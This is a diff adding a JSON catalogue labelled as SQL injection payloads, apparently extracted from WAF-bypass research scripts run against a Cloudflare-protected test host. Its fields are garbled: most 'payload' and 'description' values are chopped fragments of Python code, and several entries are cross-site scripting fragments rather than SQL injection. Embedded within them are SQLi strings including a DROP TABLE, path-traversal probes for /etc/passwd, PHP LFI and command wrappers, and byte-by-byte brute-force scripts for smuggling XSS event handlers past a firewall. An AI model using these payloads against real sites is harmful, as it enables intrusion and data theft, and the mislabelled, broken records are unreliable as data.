@@ -1,0 +1,189 @@
+{
+  "category": "sqli",
+  "subcategory": "general",
+  "count": 13,
+  "payloads": [
+    {
+      "id": "sqli-0001",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "h2'])\n        sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n        if ssock.selected_alpn_protocol() != 'h2':\n            ssock.close(); errors += 1; return 0, True, False\n        config = h2.config.H2Configuration(client_side=True)\n        conn = h2.connection.H2Connection(config=config)\n        conn.initiate_connection(); ssock.sendall(conn.data_to_send())\n        enc = urllib.parse.quote(p, safe='')\n        headers = [(':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round91_research.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0002",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "\n\" + \"=\" * 70)\nprint(\"15B: SQL Injection Vectors\")\nprint(\"=\" * 70 + \"\n\")\n\nsqli = {\n    # Basic SQLi\n    \"sqli-quote\": {\"globalHtml\": \"'\"},\n    \"sqli-double-quote\": {\"globalHtml\": '\"'},\n    \"sqli-or-1\": {\"globalHtml\": \"' OR 1=1--\"},\n    \"sqli-or-true\": {\"globalHtml\": \"' OR 'a'='a\"},\n    \"sqli-union\": {\"globalHtml\": \"' UNION SELECT 1,2,3--\"},\n    \"sqli-union-null\": {\"globalHtml\": \"' UNION SELECT NULL,NULL--\"},\n    \"sqli-sleep\": {\"globalHtml\": \"' OR SLEEP(5)--\"},\n    \"sqli-benchmark\": {\"globalHtml\": \"' OR BENCHMARK(10000000,SHA1(1))--\"},\n    \"sqli-concat\": {\"globalHtml\": \"' UNION SELECT CONCAT(0x7e,version(),0x7e)--\"},\n    \n    # Encoded SQLi\n    \"sqli-url-enc\": {\"globalHtml\": \"%27%20OR%201%3D1--\"},\n    \"sqli-double-enc\": {\"globalHtml\": \"%2527%20OR%201%253D1--\"},\n    \"sqli-comment\": {\"globalHtml\": \"1'/**/OR/**/1=1--\"},\n    \"sqli-inline-comment\": {\"globalHtml\": \"1'/*!OR*/1=1--\"},\n    \n    # NoSQL injection\n    \"nosql-ne\": {\"globalHtml\": '{\"$ne\": \"\"}'},\n    \"nosql-gt\": {\"globalHtml\": '{\"$gt\": \"\"}'},\n    \"nosql-regex\": {\"globalHtml\": '{\"$regex\": \".*\"}'},\n    \n    # Second-order SQLi patterns\n    \"sqli-stacked\": {\"globalHtml\": \"'; DROP TABLE users;--\"},\n    \"sqli-error-based\": {\"globalHtml\": \"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--\"},\n    \n    # Boolean-based blind\n    \"sqli-bool-true\": {\"globalHtml\": \"' AND 1=1 AND 'x'='x\"},\n    \"sqli-bool-false\": {\"globalHtml\": \"' AND 1=2 AND 'x'='x\"},\n    \n    # Time-based blind\n    \"sqli-time\": {\"globalHtml\": \"' AND IF(1=1,SLEEP(3),0)--\"},\n    \"sqli-pg-time\": {\"globalHtml\": \"'; SELECT pg_sleep(3);--\"},\n}\n\nfor name, params in sqli.items():\n    test(name, params=params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"15C: Path Traversal / LFI\")\nprint(\"=\" * 70 + \"\n\")\n\nlfi = {\n    \"lfi-etc-passwd\": {\"globalHtml\": \"../../../../etc/passwd\"},\n    \"lfi-etc-passwd-null\": {\"globalHtml\": \"../../../../etc/passwd%00\"},\n    \"lfi-windows\": {\"globalHtml\": \"..\\\\..\\\\..\\\\windows\\\\win.ini\"},\n    \"lfi-double-enc\": {\"globalHtml\": \"..%252f..%252f..%252fetc%252fpasswd\"},\n    \"lfi-url-enc\": {\"globalHtml\": \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"},\n    \"lfi-utf8\": {\"globalHtml\": \"..%c0%af..%c0%af..%c0%afetc/passwd\"},\n    \"lfi-filter\": {\"globalHtml\": \"php://filter/convert.base64-encode/resource=/etc/passwd\"},\n    \"lfi-data\": {\"globalHtml\": \"data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\"},\n    \"lfi-expect\": {\"globalHtml\": \"expect://id\"},\n    \"lfi-input\": {\"globalHtml\": \"php://input\"},\n}\n\nfor name, params in lfi.items():\n    test(name, params=params)\n\n# Path-based traversal\nfor payload in [\"../../../etc/passwd",
+      "description": "....//....//etc/passwd\",\n                \"%2e%2e/%2e%2e/etc/passwd\", \"..;/..;/etc/passwd",
+      "technique": "direct_injection",
+      "source_file": "waf_round15_pivot.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0003",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ss = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ss.selected_alpn_protocol() != 'h2':\n                ss.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection(); ss.sendall(conn.data_to_send())\n            conn.send_headers(1, headers, end_stream=(body is None))\n            ss.sendall(conn.data_to_send())\n            if body:\n                b = body.encode() if isinstance(body, str) else body\n                conn.send_data(1, b, end_stream=True); ss.sendall(conn.data_to_send())\n            dl = time.time() + TIMEOUT\n            resp_status = 0\n            while time.time() < dl:\n                try:\n                    ss.settimeout(max(0.3, dl - time.time()))\n                    data = ss.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if isinstance(ev, h2.events.ResponseReceived):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif isinstance(ev, h2.events.DataReceived):\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ss.sendall(conn.data_to_send())\n                    if any(isinstance(e, h2.events.StreamEnded) for e in events): break\n                except: break\n            ss.close()\n            if resp_status in (403, 406, 503): blocked += 1\n            else: passed += 1\n        except: errors += 1\n\n    for func in FUNCS[:6]:\n        p = f'<body onload={func}>'\n        enc = urllib.parse.quote(p, safe='')\n        h2_req([(':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_last.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0004",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "=\" * 80)\nprint(\"ROUNDS 86-90 BATCH 3 — 1000+ PAYLOADS\")\nprint(\"=\" * 80)\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- A: HTTP/2 + Mutations ---\")\n\ntry:\n    import h2.connection, h2.config, h2.events\n\n    def h2_req(headers, body=None, label=\"h2\"):\n        global total, blocked, passed, errors\n        total += 1\n        try:\n            ctx = ssl.create_default_context()\n            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n            ctx.set_alpn_protocols(['h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ssock.selected_alpn_protocol() != 'h2':\n                ssock.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection()\n            ssock.sendall(conn.data_to_send())\n            conn.send_headers(1, headers, end_stream=(body is None))\n            ssock.sendall(conn.data_to_send())\n            if body:\n                b = body.encode() if isinstance(body, str) else body\n                conn.send_data(1, b, end_stream=True)\n                ssock.sendall(conn.data_to_send())\n            resp_data = b\"\"; resp_status = 0\n            dl = time.time() + TIMEOUT\n            while time.time() < dl:\n                try:\n                    ssock.settimeout(max(0.3, dl - time.time()))\n                    data = ssock.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if isinstance(ev, h2.events.ResponseReceived):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif isinstance(ev, h2.events.DataReceived):\n                            resp_data += ev.data\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ssock.sendall(conn.data_to_send())\n                    if any(isinstance(e, h2.events.StreamEnded) for e in events): break\n                except: break\n            ssock.close()\n            b = resp_status in (403, 406, 503)\n            if b: blocked += 1\n            else:\n                passed += 1\n                rs = resp_data.decode('utf-8', errors='replace').lower()\n                for ind in REFLECT:\n                    if ind in rs:\n                        xss_found.append(f\"#{total} [H2 {label}]: status={resp_status}\")\n                        return\n        except:\n            errors += 1\n\n    # Apply each mutation and test via H2\n    for seed in ALL_XSS[:4]:\n        for mut in MUTS:\n            try:\n                mutated = mut(seed)\n                if mutated != seed:\n                    enc = urllib.parse.quote(mutated, safe='')\n                    headers = [\n                        (':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round88_advanced3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0005",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "\n--- H: HTTP/2 with Research Payloads ---\")\n\n# Top research payloads via H2\ntry:\n    import h2.connection, h2.config, h2.events\n    def h2_get(p, param=\"globalHtml\", label=\"h2\"):\n        global total, blocked, passed, errors\n        total += 1\n        try:\n            ctx = ssl.create_default_context()\n            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n            ctx.set_alpn_protocols(['h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ssock.selected_alpn_protocol() != 'h2':\n                ssock.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection(); ssock.sendall(conn.data_to_send())\n            enc = urllib.parse.quote(p, safe='')\n            headers = [(':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round92_research2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0006",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "select",
+      "description": "onfocus', '', ' autofocus>",
+      "technique": "direct_injection",
+      "source_file": "waf_round98_portswigger3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0007",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "utf-8', errors='surrogateescape')\n        ssock.sendall(req)\n        response = b\"\"\n        while True:\n            try:\n                ssock.settimeout(8)\n                d = ssock.recv(8192)\n                if not d: break\n                response += d\n                if len(response) > 100000: break\n            except: break\n        ssock.close()\n        \n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        \n        if not blocked and check_reflection:\n            # Check if REAL event handler made it through\n            # Look in the input tag\n            idx = resp_str.find('<input type=\"text\"')\n            if idx > 0:\n                input_tag = resp_str[idx:idx+500]\n                # Real onfocus= (without gap char) reflected?\n                if re.search(r'onfocus\\s*=', input_tag):\n                    found_real.append(name)\n                    return status, False, True, input_tag[:200]\n                # Gap char reflected?\n                elif re.search(r'on.focus\\s*=', input_tag):\n                    return status, False, False, input_tag[:200]\n        \n        return status, blocked, False, \"\"\n    except:\n        return 0, True, False, \"\"\n\n\ndef raw_post_check(name, body_bytes):\n    \"\"\"Send POST with raw bytes, check reflection.\"\"\"\n    try:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n        req = (\n            b\"POST / HTTP/1.1\r\n\"\n            b\"Host: waf.cumulusfire.net\r\n\"\n            b\"Content-Type: application/x-www-form-urlencoded\r\n\"\n            b\"Content-Length: \" + str(len(body_bytes)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\"\n            + body_bytes\n        )\n        ssock.sendall(req)\n        response = b\"\"\n        while True:\n            try:\n                ssock.settimeout(8)\n                d = ssock.recv(8192)\n                if not d: break\n                response += d\n                if len(response) > 100000: break\n            except: break\n        ssock.close()\n        \n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        \n        if not blocked:\n            idx = resp_str.find('<input type=\"text\"')\n            if idx > 0:\n                input_tag = resp_str[idx:idx+500]\n                if re.search(r'onfocus\\s*=', input_tag):\n                    found_real.append(name)\n                    return status, False, True, input_tag[:200]\n                elif re.search(r'on.focus\\s*=', input_tag):\n                    return status, False, False, input_tag[:200]\n        \n        return status, blocked, False, \"\"\n    except:\n        return 0, True, False, \"\"\n\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"=\" * 80)\nprint(\"59A: BRUTE-FORCE Every Byte 0x00-0xFF Between 'on' and 'focus'\")\nprint(\"     via URL-encoded GET attributeHtml\")\nprint(\"=\" * 80 + \"\n\")\n\n# Test: attributeHtml=\" on%XXfocus=1 autofocus x=\"\n# Where %XX is every byte from 0x00 to 0xFF\n# We URL-encode the separator byte\n\npasses = []\nblocks = 0\n\nfor byte_val in range(256):\n    hex_byte = f\"%{byte_val:02x}\"\n    # Payload: \" on<BYTE>focus=1 autofocus x=\"\n    payload = f\"%22%20on{hex_byte}focus%3D1%20autofocus%20x%3D%22\"\n    url = f\"/?attributeHtml={payload}\"\n    \n    status, blocked, real_event, snippet = raw_get_check(\n        f\"byte-0x{byte_val:02x}\", url)\n    \n    if not blocked:\n        passes.append(byte_val)\n        mark = \"\"\n        if real_event:\n            mark = \" *** REAL EVENT ***\"\n        elif snippet:\n            mark = \" gap-reflected\"\n        print(f\"  0x{byte_val:02X} ({chr(byte_val) if 32 <= byte_val < 127 else '.'}) \"\n              f\" → HTTP {status} PASS{mark}\")\n        if snippet:\n            print(f\"    {snippet[:150]}\")\n    else:\n        blocks += 1\n    \n    # Small delay every 16 bytes\n    if byte_val % 16 == 15:\n        time.sleep(0.3)\n\nprint(f\"\n  Summary: {len(passes)} passed, {blocks} blocked\")\nprint(f\"  Passing bytes: {[f'0x{b:02X}' for b in passes]}\")\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"60A: BRUTE-FORCE Raw Bytes in POST Body (No URL Encoding)\")\nprint(\"     Every byte 0x00-0xFF between 'on' and 'focus'\")\nprint(\"=\" * 80 + \"\n\")\n\n# Send raw bytes in POST body: attributeHtml=\" on<RAW_BYTE>focus=1 autofocus x=\"\npost_passes = []\n\nfor byte_val in range(256):\n    body = b'attributeHtml=\" on' + bytes([byte_val]) + b'focus=1 autofocus x=\"'\n    \n    status, blocked, real_event, snippet = raw_post_check(\n        f\"raw-0x{byte_val:02x}\", body)\n    \n    if not blocked:\n        post_passes.append(byte_val)\n        mark = \"\"\n        if real_event:\n            mark = \" *** REAL EVENT ***\"\n        elif snippet:\n            mark = \" gap-reflected\"\n        print(f\"  0x{byte_val:02X} ({chr(byte_val) if 32 <= byte_val < 127 else '.'}) \"\n              f\" → HTTP {status} PASS{mark}\")\n        if snippet:\n            print(f\"    {snippet[:150]}\")\n    \n    if byte_val % 16 == 15:\n        time.sleep(0.3)\n\nprint(f\"\n  Summary: {len(post_passes)} passed, {256 - len(post_passes)} blocked\")\nprint(f\"  Passing bytes: {[f'0x{b:02X}' for b in post_passes]}\")\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"61A: HTML Entity Encoded Bytes Between 'on' and 'focus'\")\nprint(\"     &#X;nfocus=1 where X = 0..255\")\nprint(\"=\" * 80 + \"\n\")\n\n# The payload VALUE in the attribute: \" on&#XX;focus=1 autofocus x=\"\n# After HTML entity decode, &#XX; becomes a character.\n# If that char is stripped by browser... onfocus= becomes active!\n\nent_passes = []\n\nfor code in range(256):\n    # Decimal entity\n    payload = f'\" on&#{code};focus=1 autofocus x=\"'\n    enc = urllib.parse.quote(payload)\n    url = f\"/?attributeHtml={enc}\"\n    \n    status, blocked, real_event, snippet = raw_get_check(\n        f\"ent-{code}\", url, check_reflection=True)\n    \n    if not blocked:\n        ent_passes.append(code)\n        mark = \"\"\n        if real_event:\n            mark = \" *** REAL EVENT ***\"\n        elif snippet:\n            mark = \" gap-reflected\"\n        print(f\"  &#{code}; (0x{code:02X}) → HTTP {status} PASS{mark}\")\n        if snippet:\n            print(f\"    {snippet[:150]}\")\n    \n    if code % 16 == 15:\n        time.sleep(0.3)\n\nprint(f\"\n  Summary: {len(ent_passes)} passed, {256 - len(ent_passes)} blocked\")\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"62A: Multi-Byte Unicode Chars Between 'on' and 'focus' (U+0080-U+02FF)\")\nprint(\"=\" * 80 + \"\n\")\n\n# Test higher Unicode codepoints that might be stripped by browser\n# Focus on control chars, format chars, and invisible chars\n\ninteresting_ranges = [\n    # C1 control characters (U+0080-009F) — some browsers strip these!\n    range(0x0080, 0x00A0),\n    # Latin Extended-A (letters that might be stripped)\n    range(0x0100, 0x0110),\n    # Spacing Modifier Letters\n    range(0x02B0, 0x02C0),\n    # General Punctuation — invisible/format chars\n    [0x2000, 0x2001, 0x2002, 0x2003, 0x2004, 0x2005, 0x2006, 0x2007,\n     0x2008, 0x2009, 0x200A, 0x200B, 0x200C, 0x200D, 0x200E, 0x200F,\n     0x2028, 0x2029, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x202F,\n     0x2060, 0x2061, 0x2062, 0x2063, 0x2064, 0x2066, 0x2067, 0x2068,\n     0x2069, 0x206A, 0x206B, 0x206C, 0x206D, 0x206E, 0x206F],\n    # Tags block (U+E0000-E007F) — TAG characters\n    # Variation Selectors\n    [0xFE00, 0xFE01, 0xFE02, 0xFE0E, 0xFE0F],\n    # BOM and special\n    [0xFEFF, 0xFFFE, 0xFFFF],\n    # Interlinear Annotation\n    [0xFFF9, 0xFFFA, 0xFFFB],\n]\n\nuni_passes = []\n\nfor r in interesting_ranges:\n    for cp in r:\n        try:\n            char = chr(cp)\n            payload = f'\" on{char}focus=1 autofocus x=\"'\n            enc = urllib.parse.quote(payload, safe='')\n            url = f\"/?attributeHtml={enc}\"\n            \n            status, blocked, real_event, snippet = raw_get_check(\n                f\"U+{cp:04X}\", url)\n            \n            if not blocked:\n                uni_passes.append(cp)\n                mark = \"\"\n                if real_event:\n                    mark = \" *** REAL EVENT ***\"\n                elif snippet:\n                    mark = \" gap\"\n                name = f\"U+{cp:04X}\"\n                try:\n                    import unicodedata\n                    uname = unicodedata.name(char, '')\n                    if uname:\n                        name += f\" ({uname[:30]})\"\n                except:\n                    pass\n                print(f\"  {name:50s} HTTP {status} PASS{mark}\")\n                if snippet:\n                    print(f\"    {snippet[:150]}\")\n        except:\n            pass\n        \n        if cp % 16 == 15:\n            time.sleep(0.2)\n\nprint(f\"\n  Summary: {len(uni_passes)} passed\")\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"63A: Emoji + Numeric Between 'on' and 'focus'\")\nprint(\"=\" * 80 + \"\n\")\n\n# Emoji as separator\nemoji_seps = [\n    '\\U0001F600",
+      "description": "\\U0001F4A9', '\\u2764', '\\u2620', '\\u26A0',\n    '\\U0001F525', '\\U0001F4A5', '\\U0001F6A8',\n]\n\nfor emoji in emoji_seps:\n    payload = f'\" on{emoji}focus=1 autofocus x=\"'\n    enc = urllib.parse.quote(payload, safe='",
+      "technique": "direct_injection",
+      "source_file": "waf_round59_bruteforce.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0008",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "<select autofocus onfocus=",
+      "description": ">",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_push.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0009",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ss = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ss.selected_alpn_protocol() != 'h2':\n                ss.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection(); ss.sendall(conn.data_to_send())\n            conn.send_headers(1, headers, end_stream=(body is None))\n            ss.sendall(conn.data_to_send())\n            if body:\n                b = body.encode() if isinstance(body, str) else body\n                conn.send_data(1, b, end_stream=True); ss.sendall(conn.data_to_send())\n            resp_status = 0\n            dl = time.time() + TIMEOUT\n            while time.time() < dl:\n                try:\n                    ss.settimeout(max(0.3, dl - time.time()))\n                    data = ss.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if isinstance(ev, h2.events.ResponseReceived):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif isinstance(ev, h2.events.DataReceived):\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ss.sendall(conn.data_to_send())\n                    if any(isinstance(e, h2.events.StreamEnded) for e in events): break\n                except: break\n            ss.close()\n            if resp_status in (403, 406, 503): blocked += 1\n            else: passed += 1\n        except: errors += 1\n\n    # H2 tag×func\n    for tag, suffix in TAGS[:4]:\n        for func in FUNCS[:8]:\n            p = f'{tag}{func}{suffix}'\n            enc = urllib.parse.quote(p, safe='')\n            h2_req([(':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_push.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0010",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "<select",
+      "description": " autofocus onfocus=",
+      "technique": "direct_injection",
+      "source_file": "waf_round89_advanced4.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0011",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "=\" * 80)\nprint(\"ROUNDS 86-90 BATCH 4 — FINAL 1100+ PAYLOADS\")\nprint(\"=\" * 80)\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- A: HTTP/2 + JSON + Multipart Combos ---\")\n\ntry:\n    import h2.connection, h2.config, h2.events\n\n    def h2_req(headers, body=None, label=\"h2\"):\n        global total, blocked, passed, errors\n        total += 1\n        try:\n            ctx = ssl.create_default_context()\n            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n            ctx.set_alpn_protocols(['h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ssock.selected_alpn_protocol() != 'h2':\n                ssock.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection()\n            ssock.sendall(conn.data_to_send())\n            conn.send_headers(1, headers, end_stream=(body is None))\n            ssock.sendall(conn.data_to_send())\n            if body:\n                b = body.encode() if isinstance(body, str) else body\n                conn.send_data(1, b, end_stream=True)\n                ssock.sendall(conn.data_to_send())\n            resp_data = b\"\"; resp_status = 0\n            dl = time.time() + TIMEOUT\n            while time.time() < dl:\n                try:\n                    ssock.settimeout(max(0.3, dl - time.time()))\n                    data = ssock.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if isinstance(ev, h2.events.ResponseReceived):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif isinstance(ev, h2.events.DataReceived):\n                            resp_data += ev.data\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ssock.sendall(conn.data_to_send())\n                    if any(isinstance(e, h2.events.StreamEnded) for e in events): break\n                except: break\n            ssock.close()\n            b = resp_status in (403, 406, 503)\n            if b: blocked += 1\n            else:\n                passed += 1\n                rs = resp_data.decode('utf-8', errors='replace').lower()\n                for ind in REFLECT:\n                    if ind in rs:\n                        xss_found.append(f\"#{total} [H2 {label}]: status={resp_status}\")\n                        return\n        except:\n            errors += 1\n\n    # H2 JSON with all XSS payloads\n    for xss in XSS_ALL:\n        body = json.dumps({\"globalHtml\": xss})\n        headers = [\n            (':method",
+      "description": "POST",
+      "technique": "direct_injection",
+      "source_file": "waf_round89_advanced4.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0012",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "getSelection()",
+      "description": "getSelection",
+      "technique": "direct_injection",
+      "source_file": "waf_round67_value_brute.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "sqli-0013",
+      "category": "sqli",
+      "subcategory": "general",
+      "payload": "=\" * 80)\nprint(\"ROUNDS 86-90 FINAL BATCH — 600+ PAYLOADS\")\nprint(\"=\" * 80)\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- A: HTTP/2 Remaining Combos ---\")\n\ntry:\n    import h2.connection, h2.config, h2.events\n\n    def h2_req(headers, body=None, label=\"h2\"):\n        global total, blocked, passed, errors\n        total += 1\n        try:\n            ctx = ssl.create_default_context()\n            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n            ctx.set_alpn_protocols(['h2'])\n            sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n            ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n            if ssock.selected_alpn_protocol() != 'h2':\n                ssock.close(); errors += 1; return\n            config = h2.config.H2Configuration(client_side=True)\n            conn = h2.connection.H2Connection(config=config)\n            conn.initiate_connection(); ssock.sendall(conn.data_to_send())\n            conn.send_headers(1, headers, end_stream=(body is None))\n            ssock.sendall(conn.data_to_send())\n            if body:\n                b = body.encode() if isinstance(body, str) else body\n                conn.send_data(1, b, end_stream=True); ssock.sendall(conn.data_to_send())\n            resp_data = b\"\"; resp_status = 0\n            dl = time.time() + TIMEOUT\n            while time.time() < dl:\n                try:\n                    ssock.settimeout(max(0.3, dl - time.time()))\n                    data = ssock.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if isinstance(ev, h2.events.ResponseReceived):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif isinstance(ev, h2.events.DataReceived):\n                            resp_data += ev.data\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ssock.sendall(conn.data_to_send())\n                    if any(isinstance(e, h2.events.StreamEnded) for e in events): break\n                except: break\n            ssock.close()\n            b = resp_status in (403, 406, 503)\n            if b: blocked += 1\n            else:\n                passed += 1\n                rs = resp_data.decode('utf-8', errors='replace').lower()\n                for ind in REFLECT:\n                    if ind in rs:\n                        xss_found.append(f\"#{total} [H2 {label}]: status={resp_status}\")\n                        return\n        except: errors += 1\n\n    # H2 with all remaining XSS payloads (the 4 we haven't done yet)\n    for xss in ALL_XSS[6:]:\n        enc = urllib.parse.quote(xss, safe='')\n        # GET\n        h2_req([(':method",
+      "description": "GET",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
